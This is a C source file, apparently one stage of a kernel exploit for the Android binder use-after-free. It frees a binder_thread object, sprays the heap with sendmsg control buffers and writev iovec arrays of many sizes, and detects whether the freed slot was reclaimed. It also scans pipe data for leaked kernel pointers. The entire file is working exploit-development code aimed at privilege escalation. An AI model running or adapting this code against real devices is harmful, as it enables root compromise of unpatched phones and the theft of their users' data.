/*
 * slab_probe.c — Determine binder_thread slab cache empirically
 *
 * The P0 iovec spray requires the iovec kmalloc and binder_thread kzalloc
 * to land in the SAME slab cache. This kernel has usercopy-kmalloc-* caches
 * which may separate them.
 *
 * Strategy: use sendmsg with msg_control to spray DIFFERENT sizes of
 * controlled data into the heap. The msg_control buffer is kmalloc'd at
 * exact size. After freeing binder_thread, spray with each size and see
 * which one reclaims by checking EPOLL_CTL_DEL effects.
 *
 * We detect reclaim by checking if epoll operations cause unexpected behavior
 * after the binder_thread memory is overwritten.
 *
 * Also: test if setxattr spray works (it allocates then frees, but the
 * allocation might hit the same cache briefly).
 *
 * Compile: gcc -static -O2 -o slab_probe slab_probe.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <stdint.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)

static volatile int got_signal = 0;
static void sighandler(int sig) { got_signal = sig; }

/*
 * Spray with sendmsg msg_control of a specific size.
 * The kernel kmalloc's the msg_control at exact requested size.
 * The data stays allocated while the socket has pending cmsg.
 */
static int spray_msgsend(int sv[2], int size, int count, uint32_t marker) {
    char *buf = malloc(size);
    if (!buf) return -1;
    memset(buf, 0, size);

    /* Put marker at offset 0x48 (spinlock position) — must be 0 for lock */
    /* Put recognizable pattern at 0x50 and 0x58 */
    if (size >= 0x60) {
        uint32_t zero = 0;
        memcpy(buf + 0x48, &zero, 4); /* spinlock = 0 */
        uint64_t mark = 0xDEAD000000000000ULL | marker;
        memcpy(buf + 0x50, &mark, 8);
        memcpy(buf + 0x58, &mark, 8);
    }

    /* sendmsg with cmsg (control message) — kernel kmalloc's at exact size */
    struct msghdr msg;
    struct iovec iov;
    char data = 'A';

    int i, sent = 0;
    for (i = 0; i < count; i++) {
        iov.iov_base = &data;
        iov.iov_len = 1;
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = buf;
        msg.msg_controllen = size;

        if (sendmsg(sv[0], &msg, MSG_DONTWAIT) >= 0)
            sent++;
    }

    free(buf);
    return sent;
}

/*
 * Test if a spray of a given size can reclaim binder_thread memory.
 *
 * Approach: open binder, setup epoll, free thread, spray with target size.
 * Then check if epoll operations behave differently (indicating the
 * wait_queue_head has been overwritten).
 *
 * Detection: after overwriting the wait_queue_head at offset 0x48,
 * the spinlock and list pointers are our data. If we set spinlock=0
 * and list pointers to a controlled value, then EPOLL_CTL_DEL will:
 * 1. Acquire the spinlock (succeeds because we set it to 0)
 * 2. list_del on the eppoll_entry
 * 3. list_del writes to the addresses in our controlled list pointers
 *
 * If the addresses are invalid → kernel crash (SIGSEGV/SIGBUS)
 * If the addresses are valid (our marker data) → different behavior
 *
 * We use a forked child for safety.
 */
static void test_spray_size(int target_size) {
    printf("\n--- Testing spray size %d (kmalloc-%d) ---\n",
           target_size,
           target_size <= 64 ? 64 :
           target_size <= 96 ? 96 :
           target_size <= 128 ? 128 :
           target_size <= 192 ? 192 :
           target_size <= 256 ? 256 :
           target_size <= 512 ? 512 : 1024);

    pid_t pid = fork();
    if (pid < 0) { printf("  fork failed\n"); return; }

    if (pid == 0) {
        /* Child — run in isolation for safety */
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) _exit(1);
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Free binder_thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);

        /* Spray with target size using socketpair + sendmsg */
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
            printf("  socketpair failed\n");
            _exit(2);
        }

        int sprayed = spray_msgsend(sv, target_size, 256, target_size);
        printf("  sprayed %d objects of size %d\n", sprayed, target_size);

        /* Now try EPOLL_CTL_DEL — this accesses the freed wait_queue.
         * If our spray reclaimed the slot, the wait_queue now contains
         * our data. The list_del will write to our controlled addresses. */
        got_signal = 0;
        errno = 0;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        int del_errno = errno;

        if (got_signal) {
            printf("  *** SIGNAL %d — spray RECLAIMED the slot! ***\n", got_signal);
            printf("  binder_thread is in kmalloc-%d cache\n",
                   target_size <= 64 ? 64 :
                   target_size <= 96 ? 96 :
                   target_size <= 128 ? 128 :
                   target_size <= 192 ? 192 :
                   target_size <= 256 ? 256 :
                   target_size <= 512 ? 512 : 1024);
            _exit(42); /* special code = reclaim detected */
        }

        printf("  EPOLL_CTL_DEL: ret=%d errno=%d (%s)\n",
               del_ret, del_errno, strerror(del_errno));

        /* Also check: did the binder mmap region change? */
        uint64_t kptr_after = ((uint64_t *)bmap)[0];
        printf("  binder kptr after: 0x%016llx\n", (unsigned long long)kptr_after);

        close(sv[0]); close(sv[1]);
        close(epfd);
        munmap(bmap, 4096);
        close(bfd);
        _exit(0);
    }

    /* Parent — wait with timeout */
    alarm(10);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  timeout — likely kernel hang (reclaim + deadlock?)\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42) {
            printf("  >>> RECLAIM CONFIRMED at size %d! <<<\n", target_size);
        } else if (code == 0) {
            printf("  no reclaim detected\n");
        } else {
            printf("  child exited with %d\n", code);
        }
    } else if (WIFSIGNALED(status)) {
        printf("  child killed by signal %d — possible reclaim + crash\n",
               WTERMSIG(status));
    }
}

/*
 * Also test: which iovec count would be in the same cache as binder_thread?
 * Try different iovec counts (12-20) and see if any cause corruption.
 */
static void test_iovec_reclaim(int niov) {
    printf("\n--- Testing iovec count %d (%d bytes → kmalloc-%d) ---\n",
           niov, niov * 16,
           (niov * 16) <= 256 ? 256 : 512);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) _exit(1);
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Free thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);

        /* Map page for iovec base */
        void *page = mmap((void *)0x100000000ULL, 0x1000,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        if (page == MAP_FAILED) {
            page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        }
        memset(page, 0, 0x1000);

        /* Create pipe */
        int pfd[2];
        pipe(pfd);
        fcntl(pfd[1], F_SETPIPE_SZ, 0x10000); /* big pipe, no blocking */

        /* Setup iovecs with iov[4].len=0 for spinlock */
        struct iovec iovs[32];
        int i;
        for (i = 0; i < niov; i++) {
            iovs[i].iov_base = page;
            iovs[i].iov_len = 0x100;
        }
        /* Only set iov[4].len=0 if niov > 4 */
        if (niov > 4) iovs[4].iov_len = 0;

        /* writev — kernel copies iovecs to kmalloc(niov*16) */
        /* This should reclaim the freed binder_thread if same cache */
        ssize_t written = writev(pfd[1], iovs, niov);

        /* Now do EPOLL_CTL_DEL — if reclaim happened, this touches our data */
        got_signal = 0;
        errno = 0;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);

        printf("  writev(%d iovecs) = %zd, EPOLL_CTL_DEL = %d (errno=%d)\n",
               niov, written, del_ret, errno);

        if (got_signal) {
            printf("  *** SIGNAL %d — iovec reclaim WORKS at %d iovecs! ***\n",
                   got_signal, niov);
            _exit(42);
        }

        /* Read back pipe data, check for kernel pointers */
        char buf[8192];
        ssize_t nr = read(pfd[0], buf, sizeof(buf));
        int kptrs = 0;
        uint64_t *qw = (uint64_t *)buf;
        for (i = 0; i < nr / 8; i++) {
            uint64_t v = qw[i];
            if (v >= 0xffffffc000000000ULL && v <= 0xffffffffffffffffULL) {
                kptrs++;
                if (kptrs <= 3) printf("  kptr in pipe: 0x%016llx\n",
                                       (unsigned long long)v);
            }
        }
        if (kptrs > 0)
            printf("  *** %d kernel pointers in pipe data! ***\n", kptrs);

        close(pfd[0]); close(pfd[1]);
        close(epfd); munmap(bmap, 4096); close(bfd);
        _exit(kptrs > 0 ? 43 : 0);
    }

    alarm(10);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42) printf("  >>> IOVEC RECLAIM at %d! <<<\n", niov);
        else if (code == 43) printf("  >>> KERNEL PTRS LEAKED at %d! <<<\n", niov);
    } else if (WIFSIGNALED(status)) {
        printf("  child killed by signal %d\n", WTERMSIG(status));
    }
}

int main(void) {
    printf("=== SLAB CACHE PROBE ===\n");
    printf("uid=%u\n", getuid());
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s\n", buf); }
            close(kfd);
        }
    }

    /* Test sendmsg spray at various sizes to find binder_thread's cache */
    printf("\n=== PHASE 1: sendmsg spray at various sizes ===\n");
    int sizes[] = { 192, 224, 240, 256, 304, 320, 384, 448, 512 };
    int nsizes = sizeof(sizes) / sizeof(sizes[0]);
    int i;
    for (i = 0; i < nsizes; i++) {
        test_spray_size(sizes[i]);
    }

    /* Test iovec counts to find which cache matches */
    printf("\n=== PHASE 2: iovec count probe ===\n");
    int iov_counts[] = { 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 32 };
    int ncounts = sizeof(iov_counts) / sizeof(iov_counts[0]);
    for (i = 0; i < ncounts; i++) {
        test_iovec_reclaim(iov_counts[i]);
    }

    printf("\n=== PROBE COMPLETE ===\n");
    printf("If any test showed SIGNAL or reclaim → that's the cache size.\n");
    printf("If all tests showed 'no reclaim' → usercopy cache isolation\n");
    printf("is preventing cross-cache reclaim.\n");
    return 0;
}
